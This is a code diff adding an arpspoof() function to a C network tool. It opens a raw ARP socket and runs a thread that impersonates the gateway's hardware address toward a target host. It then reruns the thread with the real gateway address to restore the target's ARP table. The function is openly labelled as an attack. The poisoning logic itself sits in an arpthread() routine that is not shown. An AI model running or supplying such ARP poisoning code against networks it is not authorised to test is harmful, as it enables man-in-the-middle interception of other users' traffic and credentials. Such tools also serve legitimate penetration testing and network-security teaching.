@@ -190,3 +190,48 @@ err:
 		close(iface);
 	return -1;
 }
+
+int arpspoof(const struct arguments *arguments, nmap_r *target)
+{
+	SOCKET arpsock = -1;
+	struct arguments argcopy;
+	pthread_t thread;
+	struct arpthreadinfo argp;
+
+	if ((arpsock = initiate_socket_for_arp(arguments->ifacename)) == -1)
+		goto err;
+	TELLSOCKETSUCCESS(arguments->ifacename);
+
+	argp.iface = arpsock;
+	argp.arguments = arguments;
+	argp.target = target;
+
+	start_signal();
+	pthread_create(&thread, NULL, arpthread, &argp);
+	pthread_join(thread, NULL);
+	g_stop = 1;
+
+	TELLRESTORINGMAC();
+	memcpy(&argcopy, arguments, sizeof(struct arguments));
+	/*
+	** very sketchy, arpthread() is using self_ha as the mac to spoof,
+	** since we want to restore the arp table we need to put the REAL
+	** gateway HA as self HA
+	*/
+	copy_mac(argcopy.self_ha, arguments->gateway_ha);
+	argp.arguments = &argcopy;
+
+	pthread_create(&thread, NULL, arpthread, &argp);
+	pthread_join(thread, NULL);
+
+	stop_signal();
+	g_stop = 1;
+	TELLSTOPATTACK();
+
+	close(arpsock);
+	return 0;
+err:
+	if (arpsock != -1)
+		close(arpsock);
+	return -1;
+}
